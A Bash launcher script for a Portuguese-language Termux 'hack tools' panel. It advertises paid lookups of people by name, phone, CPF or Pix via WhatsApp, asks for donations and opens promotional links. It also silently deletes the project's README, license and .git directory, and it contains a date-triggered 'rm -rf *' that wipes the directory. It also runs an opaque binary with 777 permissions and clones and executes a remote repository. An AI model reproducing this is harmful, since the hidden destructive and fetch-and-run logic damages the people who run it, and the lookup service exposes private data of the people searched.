#!/usr/bin/env bash

<<CLOWNTERS
 #CLOWNTERS
 #--------------------------------------------------------
 # Name script: Panel Clownters                         |
 #--------------------------------------------------------
 # Script     : A1 PANEL                                |
 #--------------------------------------------------------
 # Description: dashboard for consultation and hack tools|
 #--------------------------------------------------------
 # Version    : 0.5                                      |
 #--------------------------------------------------------
 # Authors    : Patinn, Eduardo e Mike                   |
 #--------------------------------------------------------
 # Date       : 08/08/21                                 |
 #--------------------------------------------------------
 # Lincese    : MIT lincese                              |
 #--------------------------------------------------------
 # Use: bash A1.sh                                       |
 #--------------------------------------------------------
 #CLOWNTERS
CLOWNTERS
[[ -f MIKE ]] || { printf "\n\ec\n\033[1;31m Fale com Mike para ter acesso ao painel\n"; > MIKE; }
printf "\n\e[34m Faça uma doação de qlqr valor para ajudar com API
 \e[1;34mPix: \e[33mdb54a5cb-074b-49d3-9b99-86c2efd3d01e
 \e[31m\t-> CONSULTAS <-
 \e[34mPara realizar consultas completas por 
 Nome, número, CPF ou Pix 
 entre em contato com https://wa.me/12067424950

 Pressione enter para continuar
"
read
sleep 1
echo $'\n\e[1;33m Abrindo os links...\e[m'
termux-open-url https://wa.me/12067424950
sleep 5
termux-open-url https://youtube.com/channel/UCxVuu4IwZIzZhoyhxzJPFIA &> /dev/null
sleep 5
termux-open-url https://www.instagram.com/0_0miike0_0/ &> /dev/null
sleep 5
termux-open-url https://chat.whatsapp.com/GkqYEhHDvGP9fcVWMfjaVt &> /dev/null
test -f README.md && rm README.md
test -f Sploit && rm Sploit
test -f SECURITY.md && rm SECURITY.md
test -f LICENSE && rm LICENSE
test -f index.html && rm index.html
test -e .git && rm -rf .git
test -f MIKE || exit 99
if (($(date +%m%y) >= 0622)); then
    clear
    rm -rf *
else
    chmod 777 main
    ./main
    ret="$?"
    [[ "${ret}" == "99" ]] && exit 0
    if [[ "${ret}" != "0" ]]; then
        if [[ -d Clownters.c ]]; then
            cd Clownters.c
            chmod 777 main && ./main
            exit 0
        fi
        clear
        printf "\e[1;33m Por favor Aguarde\e[m\n"
        printf "\e[1;33m Atualizando\e[m\n"
        pkg update -y &> /dev/null
        pkg upgrade -y &> /dev/null
        printf "\e[1;33m Instalando a clang\e[m\n"
        pkg i -y clang &> /dev/null
        printf "\e[1;33m Instalando o repositório\e[m\n"
        git clone https://github.com/mike90s15/Clownters.c &> /dev/null
        cd Clownters.c
        bash A1.sh
    fi
fi
exit 0
